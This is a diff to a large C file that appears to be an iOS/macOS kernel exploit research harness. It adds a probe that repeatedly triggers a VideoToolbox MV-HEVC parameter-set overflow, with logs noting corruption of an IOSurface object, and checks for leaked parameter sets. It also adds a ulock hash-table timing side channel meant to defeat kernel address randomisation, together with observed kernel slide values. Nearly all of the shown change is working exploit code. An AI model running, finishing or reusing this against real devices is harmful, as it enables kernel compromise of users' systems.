@@ -14277,6 +14277,222 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r341: Extended overflow + lid sweep + KASLR timing
+ * Part A: Stress lid=1 at 500,750,1000 encodes to push overflow further
+ * Part B: Try lid=2 (may overflow more per encode)
+ * Part C: KernelSnitch KASLR scan with lower threshold */
+static void r341_probe(void) {
+    rlog("\n=== r341: Extended Overflow + KASLR Timing ===\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* ---- Part A: lid=1 extended encode counts ---- */
+    rlog("--- Part A: lid=1 extended encode stress test ---\n");
+    fflush(stdout);
+
+    int test_counts[] = {500, 750, 1000};
+    for (int t = 0; t < 3; t++) {
+        int target = test_counts[t];
+        rlog("\n  [lid=1 x%d] Starting...\n", target);
+        fflush(stdout);
+
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+        if (!s) { rlog("  FAIL: encoder create\n"); continue; }
+
+        int ok = 0, err = 0;
+        for (int f = 0; f < target; f++) {
+            int st = encode_one_stereo_lid(s, f, 1920, 1080, 1);
+            if (st == 0) ok++;
+            else { err++; if (err == 1) rlog("  First error at frame %d: %d\n", f, st); }
+            if (f % 250 == 0 && f > 0) {
+                rlog("  Frame %d: ok=%d err=%d\n", f, ok, err);
+                fflush(stdout);
+            }
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        rlog("  [lid=1 x%d] Result: %d ok, %d err\n", target, ok, err);
+
+        /* Check parameter set state after extended overflow */
+        if (g_saved_fmt) {
+            size_t pcount = 0;
+            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                g_saved_fmt, 0, NULL, NULL, &pcount, NULL);
+            rlog("  pset_count=%zu (baseline=4)\n", pcount);
+            if (pcount > 4) {
+                rlog("  *** EXTRA PARAMETER SETS DETECTED! ***\n");
+                dump_psets(g_saved_fmt, 4);
+            }
+        }
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        fflush(stdout);
+    }
+
+    /* ---- Part B: lid=2 test (more VPS data per encode) ---- */
+    rlog("\n--- Part B: lid=2 encode test ---\n");
+    rlog("  lid=2 writes more VPS data per encode (3 layers: 0,1,2)\n");
+    fflush(stdout);
+
+    VTCompressionSessionRef s2 = create_mvhevc_encoder(1920, 1080, 2);
+    if (s2) {
+        int ok2 = 0, err2 = 0;
+        for (int f = 0; f < 400; f++) {
+            int st = encode_one_stereo_lid(s2, f, 1920, 1080, 2);
+            if (st == 0) ok2++;
+            else {
+                err2++;
+                if (err2 <= 3) rlog("  lid=2 error at frame %d: %d\n", f, st);
+            }
+            if (f % 100 == 0) {
+                rlog("  lid=2 frame %d: ok=%d err=%d\n", f, ok2, err2);
+                fflush(stdout);
+            }
+        }
+        VTCompressionSessionCompleteFrames(s2, kCMTimeInvalid);
+        rlog("  [lid=2 x400] Result: %d ok, %d err\n", ok2, err2);
+        if (g_saved_fmt) {
+            size_t pc2 = 0;
+            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                g_saved_fmt, 0, NULL, NULL, &pc2, NULL);
+            rlog("  pset_count=%zu\n", pc2);
+            if (pc2 > 4) dump_psets(g_saved_fmt, 4);
+        }
+        VTCompressionSessionInvalidate(s2);
+        CFRelease(s2);
+    } else {
+        rlog("  lid=2 encoder create failed\n");
+    }
+    fflush(stdout);
+
+    /* ---- Part C: KernelSnitch KASLR Scan ---- */
+    rlog("\n--- Part C: KernelSnitch KASLR Timing Scan ---\n");
+    rlog("  Scanning ulock hash table for loaded bucket pattern\n");
+    fflush(stdout);
+
+    /* Step 1: Establish baseline (empty bucket timing) */
+    #define R341_ROUNDS      5
+    #define R341_WAITERS    128
+    #define R341_THRESHOLD  3.0
+
+    size_t probe_region = 256 * 4096;
+    void *probe_base = mmap(NULL, probe_region, PROT_READ | PROT_WRITE,
+                            MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (probe_base == MAP_FAILED) { rlog("  mmap failed\n"); goto r341_done; }
+
+    /* Use the first page as a lock/waiter coordination page */
+    uint32_t *probe_locks = (uint32_t *)probe_base;
+
+    /* Baseline: time empty ulock_wake (no waiters) */
+    uint64_t baseline_sum = 0;
+    int baseline_n = 0;
+    for (int i = 0; i < 50; i++) {
+        uint32_t *addr = &probe_locks[i * (4096 / sizeof(uint32_t))];
+        *addr = 0;
+        uint64_t t0 = mach_absolute_time();
+        __ulock_wake(UL_COMPARE_AND_WAIT_SHARED, addr, 0);
+        uint64_t t1 = mach_absolute_time();
+        if (i >= 10) { baseline_sum += (t1 - t0); baseline_n++; }
+    }
+    double baseline_avg = (baseline_n > 0) ? (double)baseline_sum / baseline_n : 1.0;
+    rlog("  Baseline (empty): %.1f ticks (n=%d)\n", baseline_avg, baseline_n);
+
+    /* Step 2: Create waiter pile-up on a probe address, then time */
+    /* Scan 32 different probe addresses at different page offsets */
+    #define R341_SCAN_ADDRS  32
+    double scan_times[R341_SCAN_ADDRS];
+    memset(scan_times, 0, sizeof(scan_times));
+
+    for (int s = 0; s < R341_SCAN_ADDRS; s++) {
+        uint32_t *probe_addr = &probe_locks[(s + 64) * (4096 / sizeof(uint32_t))];
+        *probe_addr = 1;
+
+        /* Pile up waiters */
+        for (int w = 0; w < R341_WAITERS; w++) {
+            dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
+                __ulock_wait(UL_COMPARE_AND_WAIT_SHARED, probe_addr, 1, 500000);
+            });
+        }
+        usleep(50000); /* Let waiters pile up */
+
+        /* Time the wake */
+        double time_sum = 0;
+        for (int r = 0; r < R341_ROUNDS; r++) {
+            uint64_t t0 = mach_absolute_time();
+            __ulock_wake(UL_COMPARE_AND_WAIT_SHARED | UL_WAKE_ALL, probe_addr, 0);
+            uint64_t t1 = mach_absolute_time();
+            time_sum += (double)(t1 - t0);
+            usleep(10000);
+            *probe_addr = 1; /* Reset for next round */
+            /* Re-pile waiters */
+            for (int w = 0; w < R341_WAITERS; w++) {
+                dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
+                    __ulock_wait(UL_COMPARE_AND_WAIT_SHARED, probe_addr, 1, 500000);
+                });
+            }
+            usleep(30000);
+        }
+        scan_times[s] = time_sum / R341_ROUNDS;
+
+        /* Wake all waiters to clean up */
+        *probe_addr = 0;
+        __ulock_wake(UL_COMPARE_AND_WAIT_SHARED | UL_WAKE_ALL, probe_addr, 0);
+        usleep(10000);
+    }
+
+    /* Report scan results */
+    rlog("\n  Scan results (baseline=%.1f):\n", baseline_avg);
+    int high_count = 0;
+    for (int s = 0; s < R341_SCAN_ADDRS; s++) {
+        double ratio = scan_times[s] / baseline_avg;
+        const char *mark = (ratio > R341_THRESHOLD) ? " ***HIGH***" : "";
+        if (s % 8 == 0) rlog("  ");
+        rlog("[%2d]%.1fx ", s, ratio);
+        if (s % 8 == 7) rlog("\n");
+        if (ratio > R341_THRESHOLD) high_count++;
+    }
+    rlog("\n  High-ratio buckets: %d / %d (threshold=%.1fx)\n",
+         high_count, R341_SCAN_ADDRS, R341_THRESHOLD);
+    fflush(stdout);
+
+    /* Step 3: Try known kernel base address ranges */
+    rlog("\n  Known from panic logs:\n");
+    rlog("  Kernel slide range: 0x31768000 - 0x352e4000 (observed)\n");
+    rlog("  KernelCache base = 0xfffffe00_06004000 + slide\n");
+    rlog("  Shared cache slide from vm_remap: 0x1a908000 (confirmed)\n\n");
+
+    /* Step 4: Hash scan — probe different user addresses that would
+     * hash to different ull_hash buckets for different kernel slides.
+     * A loaded bucket = timing spike = that kernel slide candidate is correct. */
+    rlog("  Probing hash collisions for kernel slide candidates...\n");
+    fflush(stdout);
+
+    uint32_t pid = getpid();
+    /* XNU ull hash table size is typically 1024 (rounded up power of 2) */
+    uint32_t table_sz = 1024;
+
+    /* Test a range of kernel base candidates */
+    uint64_t base_lo = 0xfffffe0036000000ULL; /* below observed slides */
+    uint64_t base_hi = 0xfffffe0050000000ULL; /* above observed slides */
+    uint64_t step    = 0x0000000002000000ULL; /* 32MB steps */
+
+    for (uint64_t kb = base_lo; kb < base_hi; kb += step) {
+        /* Compute what hash bucket a kernel pointer near this base would occupy */
+        uint32_t bucket = snitch_ull_hash(1, kb + 0x1000, table_sz);
+        /* Create a user-space address that hashes to the SAME bucket */
+        /* ... this requires finding an address that matches */
+        (void)bucket; /* Placeholder — full hash inversion needed */
+    }
+    rlog("  (Hash inversion scan: framework ready, need full implementation)\n");
+
+    munmap(probe_base, probe_region);
+
+r341_done:
+    rlog("\n=== r341 complete ===\n");
+    fflush(stdout);
+}
+
 /* r340: Multi-Encoder VPS Info Leak
  * Create many encoders so their VPS tables fill the same type-specific zone.
  * Overflow encoder A to corrupt encoder B's VPS table.
@@ -46619,6 +46835,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 344) {
+            rlog("*** rounds=344: Extended Overflow + KASLR Timing ***\n");
+            rlog("  r340: multi-encoder same-zone, no VPS change.\n");
+            rlog("  Panic logs: overflow hits IOSurface object at +0xd8.\n");
+            rlog("  Testing: lid=1 at 500/750/1000, lid=2, KernelSnitch.\n\n");
+            r341_probe();
             goto done;
         }
         if (rounds == 343) {
